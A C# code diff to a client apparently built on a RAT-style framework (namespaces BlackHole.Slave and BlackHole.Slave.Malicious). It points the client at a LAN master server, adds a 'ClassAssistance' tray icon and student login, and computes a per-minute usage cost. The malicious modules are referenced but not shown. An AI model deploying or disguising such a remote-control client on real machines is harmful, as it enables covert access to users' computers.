@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using BlackHole.Slave.Helper.Native.Impl;
 using BlackHole.Slave.Malicious;
 using System.Timers;
+using System.Drawing;
 
 namespace BlackHole.Slave
 {
@@ -19,6 +20,9 @@ namespace BlackHole.Slave
         public string password;
         MasterServer mServer;
         public LoginProtect loginProtect;
+        public static NotifyIcon ni;
+        public static long startTime, endTime;
+        public static double price;
 
         public MainWindow()
         {
@@ -26,7 +30,7 @@ namespace BlackHole.Slave
             {
                 MaliciousManager.Instance.Initialize();
                 mServer = MasterServer.Instance;
-                mServer.Connect("tcp://127.0.0.1:5556");
+                mServer.Connect("tcp://10.9.0.149:5556");
 
                 Kernel32.SetConsoleCtrlHandler(ctrl =>
                 {
@@ -35,6 +39,7 @@ namespace BlackHole.Slave
                     return true;
                 }, true);
                 InitializeComponent();
+                InitialMinimize();
                 loginProtect = new LoginProtect();
             }
             catch (Exception e)
@@ -55,5 +60,42 @@ namespace BlackHole.Slave
             mServer.RequestLogin(stuid, password);
             
         }
+
+        public void InitialMinimize()
+        {
+            MenuItem menuItem1 = new MenuItem();
+            ContextMenu contextMenu = new ContextMenu();
+
+            menuItem1.Index = 0;
+            menuItem1.Text = "Log out";
+            menuItem1.Click += delegate (object sender, EventArgs args)
+            {
+                this.Show();
+                this.WindowState = WindowState.Maximized;
+                this.WindowStyle = WindowStyle.None;
+                endTime = DateTime.Now.Ticks;
+                double minutes = TimeSpan.FromTicks(endTime-startTime).TotalMinutes;
+                double totalPrice = Math.Round(minutes * price, 2);
+                System.Windows.MessageBox.Show("The total cost is " + totalPrice);
+            };
+            contextMenu.MenuItems.Add(menuItem1);
+
+            ni = new NotifyIcon();
+            ni.Text = "ClassAssistance";
+            ni.ContextMenu = contextMenu;
+            ni.Visible = true;
+
+#if DEBUG
+            ni.Icon = new Icon("../../../BlackHole.Master/Resources/icons/light/appbar.book.perspective.ico");
+#else
+            ShortCut.currentDirectory = Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+         
+            ni.Icon = new Icon(ShortCut.currentDirectory + "\\Resources\\main-blue.ico");
+            
+#endif
+
+        }
+
+
     }
 }
